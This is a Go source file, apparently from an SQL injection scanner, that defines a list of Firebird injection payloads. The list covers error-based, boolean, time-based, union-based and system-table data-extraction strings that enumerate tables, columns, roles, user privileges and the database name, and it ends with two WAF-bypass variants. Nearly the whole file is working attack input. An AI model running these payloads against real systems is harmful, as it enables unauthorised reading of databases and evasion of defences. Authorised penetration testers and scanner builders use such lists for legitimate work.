package payloads

var Firebird = PayloadGroup{
	DBMS: "Firebird",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST(CURRENT_USER AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST(CURRENT_ROLE AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST((SELECT RDB$DESCRIPTION FROM RDB$DATABASE) AS INT)--"},
		{Type: "error", Content: "' AND 1=1 UNION SELECT 1 FROM RDB$DATABASE WHERE 1=CAST((SELECT RDB$GET_CONTEXT('SYSTEM', 'DB_NAME') FROM RDB$DATABASE) AS INT)--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1 FROM RDB$DATABASE)=1--", Expected: "true"},

		// ═══════════════════════════════════════════
		// TIME-BASED (Firebird has no native sleep)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND EXISTS(SELECT 1 FROM RDB$FIELDS R1, RDB$FIELDS R2, RDB$FIELDS R3, RDB$FIELDS R4)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT 1,2 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3 FROM RDB$DATABASE--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL FROM RDB$DATABASE--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION (system tables)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$VIEW_BLR IS NULL--"},
		{Type: "deep", Content: "' UNION SELECT RDB$FIELD_NAME||':'||RDB$FIELD_SOURCE FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='USERS'--"},
		{Type: "deep", Content: "' UNION SELECT RDB$ROLE_NAME FROM RDB$ROLES--"},
		{Type: "deep", Content: "' UNION SELECT RDB$USER FROM RDB$USER_PRIVILEGES--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_USER FROM RDB$DATABASE--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_ROLE FROM RDB$DATABASE--"},
		{Type: "deep", Content: "' UNION SELECT RDB$GET_CONTEXT('SYSTEM', 'DB_NAME') FROM RDB$DATABASE--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "1'%09OR%091=1--"},
		{Type: "bypass", Content: "1'/**/OR/**/1=1--"},
	},
}

